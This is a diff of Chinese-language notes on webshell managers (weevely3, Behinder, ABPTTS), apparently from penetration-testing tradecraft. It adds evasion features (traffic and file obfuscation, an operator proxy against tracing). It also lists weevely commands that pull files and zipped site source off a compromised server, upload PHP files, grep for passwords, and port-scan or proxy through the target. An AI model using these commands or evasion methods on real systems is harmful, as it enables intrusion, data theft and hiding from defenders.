@@ -1,12 +1,16 @@
 ### Webshell管理工具
 
-主控端proxy可"隐藏"主控端IP 亲测可用
+* 通用功能
+  * 主控端proxy - 主控端可使用代理IP与webshell交互 主控端的自我保护"反溯源"
+  * 流量混淆 - 避免被NTA检测明文流量
+  * 文件混淆 - 避免被agent查杀
+  * ...
 
-|webshell名称|主控端|目标环境|主控端proxy|描述|
-|:-------------:|--|--|-----|----|
-|[epinna/weevely3](https://github.com/epinna/weevely3)|python2| php | [shell proxy](sec_proxy.md#shell-proxy)|更适合linux环境下的后渗透 |
-|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|.php/.jsp/.asp（.NET)|自带 http(s) proxy|“冰蝎” 动态二进制加密 webshell管理端|
-|[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|/|TCP tunneling over HTTP/HTTPS for web application servers. [Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |
+|名称|主控端|目标环境|文件特征|流量特征|主控端proxy|描述|
+|:-------------:|--|--|--|--|-----|----|
+|[epinna/weevely3](https://github.com/epinna/weevely3)|python2| php | 文件内容默认混淆 | 默认混淆|[shell proxy](sec_proxy.md#shell-proxy)|更适合linux环境下的后渗透. 特别的一点是自带php实现的zip压缩,便于打包"web应用源码"等|
+|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|.php .jsp .asp .aspx(.NET)| 文件内容默认固定 可做混淆 | aes加密流量 |http(s) proxy|“冰蝎” 动态二进制加密 webshell管理端 |
+|[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|/|/|/|TCP tunneling over HTTP/HTTPS for web application servers. [Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |
 
 #### jsp环境
 
@@ -29,14 +33,15 @@ touch -r 1.jsp webshell.jsp
   * 下载文件命令`:file_download result.zip /Users/xxx/Downloads/result.zip` 把目标站的`result.zip` 下载到本地`Downloads/result.zip`
   * 上传文件命令`:file_upload /Users/xxx/Downloads/1.png file.png -force -vector fwrite`把本地文件/数据 上传到 远程目标站`file.png` 参数`-force`表示如果文件存在则强制覆盖
   * 上传文件命令`:file_upload -content "testdata" data.php` 把本地文件/数据 上传到 远程目标站`data.php`
-  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip 注意压缩过程可能被中断(判断方法是临时压缩文件大小不变) 建议重新执行压缩文件命令(实测某次压缩过程被中断6次才压缩成功 最终压缩包大小为2G)
+  * 压缩文件命令`:file_zip site.zip ./` 把当前目录下所有文件压缩成site.zip 注意避免递归压缩!(压缩包 不应保存在被压缩或将被压缩的文件夹中)否则压缩过程被中断!
   * 压缩文件命令`:file_gzip site.gz ./` 只支持linux
+  * 压缩文件命令`:file_tar` 只支持linux(待确认)
   * 搜索内容命令`:file_grep ./ "pass"` 不建议搜索大目录
 * net网络请求
   * 端口扫描 - 使用PHP函数[fsockopen](https://www.php.net/manual/en/function.fsockopen.php)实现
     * 工具命令`:net_scan 127.0.0.1 21,22,80,443,1433,3306,3389,7001`
   * proxy
-    * 工具命令`:net_proxy` 使用目标主机发起http(s)请求
+    * 工具命令`:net_proxy` 使用目标主机的IP发起http(s)请求
     * 工具命令`:net_curl http://ipconfig.io/json`  模拟curl 使用目标主机发起http(s)请求
 * DB数据库操作
   * SQL交互
